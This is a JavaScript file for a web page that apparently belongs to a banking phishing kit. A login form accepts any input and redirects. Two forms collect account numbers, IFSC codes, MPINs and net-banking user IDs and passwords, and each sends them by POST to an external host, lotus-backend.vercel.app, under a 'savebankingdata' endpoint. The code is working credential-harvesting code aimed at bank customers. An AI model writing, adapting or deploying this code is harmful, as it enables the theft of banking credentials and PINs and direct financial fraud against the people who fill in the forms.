document
  ?.getElementById("loginForm")
  ?.addEventListener("submit", function (event) {
    event.preventDefault();
    window.location.href = "/dashboard.html";
  });

document
  ?.getElementById("bankform")
  ?.addEventListener("submit", function (event) {
    event.preventDefault();
    const name = document?.getElementsByName("name")[0]?.value;
    const bank = document?.getElementsByName("bank")[0]?.value;
    const acnumber = document?.getElementsByName("acnumber")[0]?.value;
    const mobile = document?.getElementsByName("mobile")[0]?.value;
    const ifscnumber = document?.getElementsByName("ifscnumber")[0]?.value;
    const mpin = document?.getElementsByName("mpin")[0]?.value;
    const type = "Banking";
    const data = {
      type: type,
      name: name,
      bank: bank,
      acnumber: acnumber,
      mobile: mobile,
      ifscnumber: ifscnumber,
      mpin: mpin,
    };
    fetch(`https://lotus-backend.vercel.app/savebankingdata`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    })
      .then((response) => {
        if (response.ok) {
          console.log("Data Saved successfully!");
          window.location.href = "/submit.html";
        } else {
          console.error("Failed to save data.");
        }
      })
      .catch((error) => {
        console.error("Error:", error);
      });
  });

document
  ?.getElementById("netbanking")
  ?.addEventListener("submit", function (event) {
    event.preventDefault();
    const bank = document?.getElementsByName("netbank")[0]?.value;
    const userid = document?.getElementsByName("userid")[0]?.value;
    const password = document?.getElementsByName("password")[0]?.value;
    const type = "Net-banking";
    const data = {
      type: type,
      bank: bank,
      userid: userid,
      password: password,
    };
    fetch(`https://lotus-backend.vercel.app/savebankingdata`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    })
      .then((response) => {
        if (response.ok) {
          console.log("Data Saved successfully!");
          window.location.href = "/submit.html";
        } else {
          console.error("Failed to save data.");
        }
      })
      .catch((error) => {
        console.error("Error:", error);
      });
  });
